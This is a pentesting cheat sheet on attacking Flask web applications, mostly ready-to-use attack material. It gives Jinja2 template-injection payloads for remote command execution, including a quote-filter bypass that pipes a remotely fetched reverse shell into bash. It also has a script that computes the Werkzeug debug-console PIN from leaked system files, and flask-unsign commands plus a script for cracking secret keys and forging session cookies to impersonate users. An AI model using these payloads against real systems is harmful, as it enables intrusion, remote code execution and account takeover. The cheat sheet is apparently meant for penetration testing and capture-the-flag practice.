---
description: A Python library for routing and hosting a website
---

# Flask

## Jinja2 Server-side Template Injection (SSTI)

Inject the Jinja2 templating language for when the `render_template_string()` function is used

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti" %}
HackTricks explaining exploitation in detail
{% endembed %}

### 1. Detect

```django
{{7*7}}
{{config}}
```

### 2. Find subclasses to use for RCE

```django
''.__class__.mro()[1].__subclasses__()
```

Then take the response and replace `,` with `\n` in Visual Studio Code to easily see line number of index

### 3. Use subclass for RCE

Find a vulnerable subclass and replace `42` with the index of it in the `__subclasses__()`

```django
'subprocess.Popen': {{''.__class__.mro()[1].__subclasses__()[42]('id',shell=True,stdout=-1).communicate()[0].strip()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Filter Bypass

{% embed url="https://jorianwoltjer.com/blog/post/ctf/cyber-apocalypse-2021/build-yourself-in" %}
Writeup of challenge where quotes (`'` & `"`) were blocked
{% endembed %}

```django
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl IP:PORT/revshell | bash")|attr("read")()}}
```

## Console PIN

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug" %}

With a Local File Read vulnerability one could leak the necessary 'private' information required to generate the PIN. From the console you can then run any Python statement and get RCE with a Reverse Shell

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'web3_user',  # username, /etc/passwd
    'flask.app',  # always the same
    'Flask',  # always the same
    '/usr/local/lib/python3.5/dist-packages/flask/app.py' # The absolute path of app.py in the flask directory. If app.py doesn't work, try app.pyc
]

private_bits = [
    '279275995014060',  # MAC, /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'  # /etc/machine-id, /proc/sys/kernel/random/boot_id, /proc/self/cgroup
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

## Session Cookie

If you have a `SECRET_KEY` of the Flask application you can forge your own `session=` cookies. This can be useful to bypass authentication or even try injection attacks inside the parameters of the session.&#x20;

### Brute-force

{% code title="Install" %}
```
pip install flask-unsign
```
{% endcode %}

<pre class="language-shell-session" data-overflow="wrap"><code class="lang-shell-session"><strong>$ flask-unsign --wordlist /list/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiajByMmFuIn0.Yu6Z8A._RI4cQ2NSYW2epWYt-mR5cfkg0U' --no-literal-eval
</strong>[*] Session decodes to: {'logged_in': True, 'username': 'j0r2an'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17152 attempts
b'secret123'
</code></pre>

### Forging Session

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret123'
</strong>eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.YvlBnA.yo-Ef_eiy_aeDBgBK-cQdcu-nRw
</code></pre>

{% hint style="warning" %}
If in a script it might need the `--legacy` argument to get correct timestamps
{% endhint %}

### Automate Forging

Using a Python script you can automate this forging process to forge lots of values and find different responses

<details>

<summary>find_users.py</summary>

```python
from flask_unsign import session
from tqdm import tqdm
import requests

with open("/list/username.txt") as f:
    usernames = [l.strip() for l in f.readlines()]

SECRET_KEY = "secret123"

for username in tqdm(usernames):
    result = session.sign({'logged_in': True, 'username': username}, secret=SECRET_KEY, legacy=True)

    r = requests.get("http://10.10.11.160:5000/dashboard", cookies={"session": result}, allow_redirects=False)
    
    if r.status_code == 200:  # Found
        print("FOUND USER", username, result)
```

</details>

